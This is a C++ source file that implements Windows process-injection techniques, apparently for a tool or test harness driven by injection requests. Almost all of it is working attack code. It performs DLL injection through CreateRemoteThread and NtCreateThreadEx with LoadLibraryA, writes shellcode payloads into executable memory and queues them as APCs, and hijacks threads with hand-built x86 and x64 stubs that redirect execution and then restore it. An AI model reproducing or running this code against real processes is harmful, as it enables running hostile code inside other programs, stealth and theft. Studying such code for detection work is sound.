#include "handler_threads.h"
#include "process_utils.h"
#include "thread_utils.h"
#include "payload_utils.h"

#include <cstring>
#include <string>
#include <vector>

#ifndef _WIN32

dispatch_outcome handle_create_remote_thread(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_queue_user_apc(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_nt_create_thread_ex(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

dispatch_outcome handle_thread_hijack(const rw_injection_request*, const parsed_params&)
{
    return { false, "TECHNIQUE_UNSUPPORTED_PLATFORM", "Technique not implemented on this platform." };
}

#else
#include <tlhelp32.h>

namespace
{
    using NtCreateThreadEx_t = LONG(WINAPI*)(
        PHANDLE thread_handle,
        ACCESS_MASK desired_access,
        PVOID object_attributes,
        HANDLE process_handle,
        PVOID start_routine,
        PVOID argument,
        ULONG create_flags,
        SIZE_T zero_bits,
        SIZE_T stack_size,
        SIZE_T maximum_stack_size,
        PVOID attribute_list);

    using NtContinue_t = LONG (NTAPI*)(PCONTEXT context, BOOLEAN test_alert);

    std::optional<int> get_thread_id(const parsed_params& params)
    {
        if (const auto thread_id = params.get_int("threadId"))
        {
            return thread_id;
        }
        return params.get_int("targetThreadId");
    }

    NtCreateThreadEx_t resolve_nt_create_thread_ex()
    {
        HMODULE ntdll = ::GetModuleHandleA("ntdll.dll");
        if (!ntdll)
        {
            return nullptr;
        }
        return reinterpret_cast<NtCreateThreadEx_t>(::GetProcAddress(ntdll, "NtCreateThreadEx"));
    }

    NtContinue_t resolve_nt_continue()
    {
        HMODULE ntdll = ::GetModuleHandleA("ntdll.dll");
        if (!ntdll)
        {
            return nullptr;
        }
        return reinterpret_cast<NtContinue_t>(::GetProcAddress(ntdll, "NtContinue"));
    }

    bool get_is_wow64(HANDLE process, bool& is_wow64)
    {
        using IsWow64Process_t = BOOL(WINAPI*)(HANDLE, PBOOL);
        static IsWow64Process_t is_wow64_process =
            reinterpret_cast<IsWow64Process_t>(::GetProcAddress(::GetModuleHandleA("kernel32.dll"), "IsWow64Process"));

        if (!is_wow64_process)
        {
            is_wow64 = false;
            return true;
        }

        BOOL result = FALSE;
        if (!is_wow64_process(process, &result))
        {
            return false;
        }

        is_wow64 = result != FALSE;
        return true;
    }

    bool try_find_thread_for_process(DWORD pid, DWORD exclude_thread, DWORD& thread_id)
    {
        HANDLE snapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
        if (snapshot == INVALID_HANDLE_VALUE)
        {
            return false;
        }

        THREADENTRY32 entry{};
        entry.dwSize = sizeof(entry);

        if (!::Thread32First(snapshot, &entry))
        {
            ::CloseHandle(snapshot);
            return false;
        }

        do
        {
            if (entry.th32OwnerProcessID == pid && entry.th32ThreadID != exclude_thread)
            {
                thread_id = entry.th32ThreadID;
                ::CloseHandle(snapshot);
                return true;
            }
        } while (::Thread32Next(snapshot, &entry));

        ::CloseHandle(snapshot);
        return false;
    }

    void* alloc_target_memory(HANDLE process, size_t size, DWORD protect, bool is_self)
    {
        if (is_self)
        {
            return ::VirtualAlloc(nullptr, size, MEM_COMMIT | MEM_RESERVE, protect);
        }

        return ::VirtualAllocEx(process, nullptr, size, MEM_COMMIT | MEM_RESERVE, protect);
    }

    void free_target_memory(HANDLE process, void* address, bool is_self)
    {
        if (!address)
        {
            return;
        }

        if (is_self)
        {
            ::VirtualFree(address, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, address, 0, MEM_RELEASE);
        }
    }

    bool write_target_memory(HANDLE process, void* destination, const void* source, size_t size, bool is_self)
    {
        if (!destination || !source)
        {
            return false;
        }

        if (is_self)
        {
            std::memcpy(destination, source, size);
            return true;
        }

        return ::WriteProcessMemory(process, destination, source, size, nullptr) != 0;
    }
}

dispatch_outcome handle_create_remote_thread(const rw_injection_request* req, const parsed_params&)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = req ? req->payload_path : nullptr;
    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "DLL payload was not found." };
    }

    // Resolve LoadLibraryA.
    HMODULE kernel32 = ::GetModuleHandleA("kernel32.dll");
    if (!kernel32)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PROC_ADDRESS_NOT_FOUND", "Could not resolve kernel32." };
    }

    FARPROC load_library = ::GetProcAddress(kernel32, "LoadLibraryA");
    if (!load_library)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PROC_ADDRESS_NOT_FOUND", "Could not resolve LoadLibraryA." };
    }

    const size_t path_len = std::strlen(payload_path) + 1;
    LPVOID remote_buffer = nullptr;
    if (process == ::GetCurrentProcess())
    {
        remote_buffer = ::VirtualAlloc(nullptr, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }
    else
    {
        remote_buffer = ::VirtualAllocEx(process, nullptr, path_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    }

    if (!remote_buffer)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for DLL path." };
    }

    BOOL write_ok = FALSE;
    if (process == ::GetCurrentProcess())
    {
        std::memcpy(remote_buffer, payload_path, path_len);
        write_ok = TRUE;
    }
    else
    {
        write_ok = ::WriteProcessMemory(process, remote_buffer, payload_path, path_len, nullptr);
    }

    if (!write_ok)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write DLL path to target process." };
    }

    HANDLE thread = nullptr;
    if (process == ::GetCurrentProcess())
    {
        thread = ::CreateThread(nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(load_library), remote_buffer, 0, nullptr);
    }
    else
    {
        thread = ::CreateRemoteThread(process, nullptr, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(load_library), remote_buffer, 0, nullptr);
    }

    if (!thread)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
            ::CloseHandle(process);
        }
        return { false, "THREAD_CREATE_FAILED", "Failed to start LoadLibraryA thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    DWORD exit_code = 0;
    ::GetExitCodeThread(thread, &exit_code);
    ::CloseHandle(thread);

    if (process == ::GetCurrentProcess())
    {
        ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
    }
    else
    {
        ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
        ::CloseHandle(process);
    }

    if (exit_code == 0)
    {
        return { false, "DLL_LOAD_FAILED", "LoadLibraryA failed in target process." };
    }

    return { true, nullptr, nullptr };
}

dispatch_outcome handle_queue_user_apc(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    // Optional timeoutMs must be non-negative if provided.
    if (const auto timeout = params.get_int("timeoutMs"))
    {
        if (*timeout < 0)
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "TECHNIQUE_PARAM_INVALID", "timeoutMs must be zero or greater." };
        }
    }

    DWORD target_thread_id = 0;
    if (const auto thread_id = get_thread_id(params))
    {
        if (*thread_id <= 0)
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "TECHNIQUE_PARAM_INVALID", "threadId must be greater than zero." };
        }
        target_thread_id = static_cast<DWORD>(*thread_id);
    }
    else if (req && (req->target.kind == RW_TARGET_SELF || (req->target.kind == RW_TARGET_PROCESS_ID && req->target.pid == ::GetCurrentProcessId())))
    {
        target_thread_id = ::GetCurrentThreadId();
    }
    else
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "TECHNIQUE_PARAM_REQUIRED", "QueueUserAPC requires threadId for remote targets." };
    }

    HANDLE thread = nullptr;
    bool close_thread = true;
    if (target_thread_id == ::GetCurrentThreadId())
    {
        thread = ::GetCurrentThread();
        close_thread = false; // pseudo-handle
    }
    else
    {
        thread = open_thread_for_injection(target_thread_id, failure);
        if (!thread)
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return failure;
        }
    }

    const char* payload_path = req ? req->payload_path : nullptr;
    if (!payload_exists(payload_path))
    {
        ::CloseHandle(thread);
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "APC payload was not found." };
    }

    std::vector<unsigned char> payload;
    if (!read_payload_file(payload_path, payload))
    {
        ::CloseHandle(thread);
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_READ_FAILED", "Failed to read APC payload." };
    }

    LPVOID remote_buffer = nullptr;
    SIZE_T payload_size = payload.size();
    if (process == ::GetCurrentProcess())
    {
        remote_buffer = ::VirtualAlloc(nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }
    else
    {
        remote_buffer = ::VirtualAllocEx(process, nullptr, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    }

    if (!remote_buffer)
    {
        ::CloseHandle(thread);
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for APC payload." };
    }

    BOOL write_ok = FALSE;
    if (process == ::GetCurrentProcess())
    {
        std::memcpy(remote_buffer, payload.data(), payload_size);
        write_ok = TRUE;
    }
    else
    {
        write_ok = ::WriteProcessMemory(process, remote_buffer, payload.data(), payload_size, nullptr);
    }

    if (!write_ok)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
            ::CloseHandle(process);
        }
        ::CloseHandle(thread);
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write APC payload." };
    }

    if (::QueueUserAPC(reinterpret_cast<PAPCFUNC>(remote_buffer), thread, 0) == 0)
    {
        if (process == ::GetCurrentProcess())
        {
            ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
        }
        else
        {
            ::VirtualFreeEx(process, remote_buffer, 0, MEM_RELEASE);
            ::CloseHandle(process);
        }
        ::CloseHandle(thread);
        if (close_thread)
        {
            ::CloseHandle(thread);
        }
        return { false, "APC_QUEUE_FAILED", "Failed to queue APC." };
    }

    if (req && req->target.kind == RW_TARGET_SELF && target_thread_id == ::GetCurrentThreadId())
    {
        ::SleepEx(0, TRUE);
        ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
    }
    else if (process == ::GetCurrentProcess())
    {
        ::VirtualFree(remote_buffer, 0, MEM_RELEASE);
    }

    if (close_thread)
    {
        ::CloseHandle(thread);
    }
    if (process != ::GetCurrentProcess())
    {
        // Leave remote memory allocated to avoid freeing before APC runs.
        ::CloseHandle(process);
    }

    return { true, nullptr, nullptr };
}

dispatch_outcome handle_nt_create_thread_ex(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = req ? req->payload_path : nullptr;
    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "DLL payload was not found." };
    }

    HMODULE kernel32 = ::GetModuleHandleA("kernel32.dll");
    if (!kernel32)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PROC_ADDRESS_NOT_FOUND", "Could not resolve kernel32." };
    }

    FARPROC load_library = ::GetProcAddress(kernel32, "LoadLibraryA");
    if (!load_library)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PROC_ADDRESS_NOT_FOUND", "Could not resolve LoadLibraryA." };
    }

    const size_t path_len = std::strlen(payload_path) + 1;
    const bool is_self = process == ::GetCurrentProcess();

    void* remote_buffer = alloc_target_memory(process, path_len, PAGE_READWRITE, is_self);
    if (!remote_buffer)
    {
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for DLL path." };
    }

    if (!write_target_memory(process, remote_buffer, payload_path, path_len, is_self))
    {
        free_target_memory(process, remote_buffer, is_self);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write DLL path to target process." };
    }

    NtCreateThreadEx_t create_thread = resolve_nt_create_thread_ex();
    if (!create_thread)
    {
        free_target_memory(process, remote_buffer, is_self);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "NT_CREATE_THREAD_EX_NOT_FOUND", "NtCreateThreadEx could not be resolved." };
    }

    ULONG create_flags = 0;
    if (const auto flag_value = params.get_int("creationFlags"))
    {
        if (*flag_value < 0)
        {
            free_target_memory(process, remote_buffer, is_self);
            if (!is_self)
            {
                ::CloseHandle(process);
            }
            return { false, "TECHNIQUE_PARAM_INVALID", "creationFlags must be zero or greater." };
        }

        create_flags = static_cast<ULONG>(*flag_value);
    }

    HANDLE thread = nullptr;
    LONG status = create_thread(&thread, THREAD_ALL_ACCESS, nullptr, process, reinterpret_cast<PVOID>(load_library), remote_buffer, create_flags, 0, 0, 0, nullptr);
    if (status != 0 || !thread)
    {
        free_target_memory(process, remote_buffer, is_self);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "NT_CREATE_THREAD_EX_FAILED", "NtCreateThreadEx failed to create the thread." };
    }

    ::WaitForSingleObject(thread, INFINITE);
    DWORD exit_code = 0;
    ::GetExitCodeThread(thread, &exit_code);
    ::CloseHandle(thread);

    free_target_memory(process, remote_buffer, is_self);

    if (!is_self)
    {
        ::CloseHandle(process);
    }

    if (exit_code == 0)
    {
        return { false, "DLL_LOAD_FAILED", "LoadLibraryA failed in target process." };
    }

    return { true, nullptr, nullptr };
}

dispatch_outcome handle_thread_hijack(const rw_injection_request* req, const parsed_params& params)
{
    dispatch_outcome failure{};
    HANDLE process = open_process_for_injection(req,
        PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ,
        failure);
    if (!process)
    {
        return failure;
    }

    const char* payload_path = req ? req->payload_path : nullptr;
    if (!payload_exists(payload_path))
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_NOT_FOUND", "DLL payload was not found." };
    }

    // Optional threadId parameter must be positive if present.
    DWORD target_thread_id = 0;
    if (const auto thread_id = get_thread_id(params))
    {
        if (*thread_id <= 0)
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "TECHNIQUE_PARAM_INVALID", "threadId must be greater than zero." };
        }
        target_thread_id = static_cast<DWORD>(*thread_id);
    }
    else
    {
        DWORD pid = ::GetProcessId(process);
        DWORD exclude = (process == ::GetCurrentProcess()) ? ::GetCurrentThreadId() : 0;
        if (!try_find_thread_for_process(pid, exclude, target_thread_id))
        {
            if (process != ::GetCurrentProcess())
            {
                ::CloseHandle(process);
            }
            return { false, "THREAD_NOT_FOUND", "No suitable thread found to hijack." };
        }
    }

    HANDLE thread = open_thread_for_injection(target_thread_id, failure);
    if (!thread)
    {
        if (process != ::GetCurrentProcess())
        {
            ::CloseHandle(process);
        }
        return failure;
    }

    bool is_self = process == ::GetCurrentProcess();
    if (is_self && target_thread_id == ::GetCurrentThreadId())
    {
        ::CloseHandle(thread);
        return { false, "THREAD_HIJACK_UNSUPPORTED", "Cannot hijack the current thread." };
    }

    bool current_wow64 = false;
    bool target_wow64 = false;
    if (!get_is_wow64(::GetCurrentProcess(), current_wow64) || !get_is_wow64(process, target_wow64))
    {
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "TARGET_ARCH_CHECK_FAILED", "Failed to determine target architecture." };
    }

    if (current_wow64 != target_wow64)
    {
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "TARGET_ARCH_UNSUPPORTED", "Cross-architecture thread hijack is not supported." };
    }

    DWORD suspend_result = ::SuspendThread(thread);
    if (suspend_result == static_cast<DWORD>(-1))
    {
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "THREAD_SUSPEND_FAILED", "Failed to suspend target thread." };
    }

    CONTEXT context{};
    context.ContextFlags = CONTEXT_FULL;
    if (!::GetThreadContext(thread, &context))
    {
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "THREAD_CONTEXT_FAILED", "Failed to read thread context." };
    }
    CONTEXT resume_context = context;

    HMODULE kernel32 = ::GetModuleHandleA("kernel32.dll");
    if (!kernel32)
    {
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PROC_ADDRESS_NOT_FOUND", "Could not resolve kernel32." };
    }

    FARPROC load_library = ::GetProcAddress(kernel32, "LoadLibraryA");
    if (!load_library)
    {
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PROC_ADDRESS_NOT_FOUND", "Could not resolve LoadLibraryA." };
    }

    NtContinue_t nt_continue = resolve_nt_continue();
    if (!nt_continue)
    {
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "NT_CONTINUE_NOT_FOUND", "Could not resolve NtContinue." };
    }

    const size_t path_len = std::strlen(payload_path) + 1;
    void* remote_path = alloc_target_memory(process, path_len, PAGE_READWRITE, is_self);
    if (!remote_path)
    {
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for DLL path." };
    }

    if (!write_target_memory(process, remote_path, payload_path, path_len, is_self))
    {
        free_target_memory(process, remote_path, is_self);
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write DLL path to target process." };
    }

    void* remote_context = alloc_target_memory(process, sizeof(CONTEXT), PAGE_READWRITE, is_self);
    if (!remote_context)
    {
        free_target_memory(process, remote_path, is_self);
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for thread context." };
    }

    if (!write_target_memory(process, remote_context, &resume_context, sizeof(resume_context), is_self))
    {
        free_target_memory(process, remote_context, is_self);
        free_target_memory(process, remote_path, is_self);
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write thread context to target process." };
    }

#ifdef _WIN64
    const unsigned long long original_ip = context.Rip;
#else
    const unsigned long original_ip = context.Eip;
#endif

    std::vector<unsigned char> stub;
#ifdef _WIN64
    auto append_u64 = [&stub](unsigned long long value)
    {
        const unsigned char* bytes = reinterpret_cast<const unsigned char*>(&value);
        stub.insert(stub.end(), bytes, bytes + sizeof(value));
    };

    stub.insert(stub.end(), { 0x49, 0x89, 0xE3 }); // mov r11, rsp
    stub.insert(stub.end(), { 0x48, 0x83, 0xE4, 0xF0 }); // and rsp, 0xFFFFFFFFFFFFFFF0
    stub.insert(stub.end(), { 0x48, 0x83, 0xEC, 0x20 }); // sub rsp, 0x20
    stub.push_back(0x48);
    stub.push_back(0xB9); // mov rcx, imm64
    const unsigned long long arg = reinterpret_cast<unsigned long long>(remote_path);
    append_u64(arg);
    stub.push_back(0x48);
    stub.push_back(0xB8); // mov rax, imm64
    const unsigned long long loader = reinterpret_cast<unsigned long long>(load_library);
    append_u64(loader);
    stub.insert(stub.end(), { 0xFF, 0xD0 }); // call rax

    stub.push_back(0x48);
    stub.push_back(0xB9); // mov rcx, imm64
    const unsigned long long ctx = reinterpret_cast<unsigned long long>(remote_context);
    append_u64(ctx);
    stub.insert(stub.end(), { 0x31, 0xD2 }); // xor edx, edx
    stub.push_back(0x48);
    stub.push_back(0xB8); // mov rax, imm64
    const unsigned long long cont = reinterpret_cast<unsigned long long>(nt_continue);
    append_u64(cont);
    stub.insert(stub.end(), { 0xFF, 0xD0 }); // call rax

    stub.insert(stub.end(), { 0x4C, 0x89, 0xDC }); // mov rsp, r11
    stub.insert(stub.end(), { 0xFF, 0x25, 0x00, 0x00, 0x00, 0x00 }); // jmp [rip]
    append_u64(original_ip);
#else
    auto append_u32 = [&stub](unsigned long value)
    {
        const unsigned char* bytes = reinterpret_cast<const unsigned char*>(&value);
        stub.insert(stub.end(), bytes, bytes + sizeof(value));
    };

    stub.push_back(0x68); // push imm32
    const unsigned long arg = reinterpret_cast<unsigned long>(remote_path);
    append_u32(arg);
    stub.push_back(0xB8); // mov eax, imm32
    const unsigned long loader = reinterpret_cast<unsigned long>(load_library);
    append_u32(loader);
    stub.insert(stub.end(), { 0xFF, 0xD0 }); // call eax
    stub.push_back(0x6A); // push 0
    stub.push_back(0x00);
    stub.push_back(0x68); // push imm32
    const unsigned long ctx = reinterpret_cast<unsigned long>(remote_context);
    append_u32(ctx);
    stub.push_back(0xB8); // mov eax, imm32
    const unsigned long cont = reinterpret_cast<unsigned long>(nt_continue);
    append_u32(cont);
    stub.insert(stub.end(), { 0xFF, 0xD0 }); // call eax
    stub.push_back(0x68); // push imm32
    append_u32(original_ip);
    stub.push_back(0xC3); // ret
#endif

    void* remote_stub = alloc_target_memory(process, stub.size(), PAGE_EXECUTE_READWRITE, is_self);
    if (!remote_stub)
    {
        free_target_memory(process, remote_context, is_self);
        free_target_memory(process, remote_path, is_self);
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_ALLOC_FAILED", "Failed to allocate memory for thread stub." };
    }

    if (!write_target_memory(process, remote_stub, stub.data(), stub.size(), is_self))
    {
        free_target_memory(process, remote_stub, is_self);
        free_target_memory(process, remote_context, is_self);
        free_target_memory(process, remote_path, is_self);
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "PAYLOAD_WRITE_FAILED", "Failed to write thread stub." };
    }

    ::FlushInstructionCache(process, remote_stub, stub.size());

#ifdef _WIN64
    context.Rip = reinterpret_cast<unsigned long long>(remote_stub);
#else
    context.Eip = reinterpret_cast<unsigned long>(remote_stub);
#endif

    if (!::SetThreadContext(thread, &context))
    {
        free_target_memory(process, remote_stub, is_self);
        free_target_memory(process, remote_context, is_self);
        free_target_memory(process, remote_path, is_self);
        ::ResumeThread(thread);
        ::CloseHandle(thread);
        if (!is_self)
        {
            ::CloseHandle(process);
        }
        return { false, "THREAD_CONTEXT_FAILED", "Failed to update thread context." };
    }

    ::ResumeThread(thread);
    ::CloseHandle(thread);

    if (!is_self)
    {
        ::CloseHandle(process);
    }

    return { true, nullptr, nullptr };
}
#endif
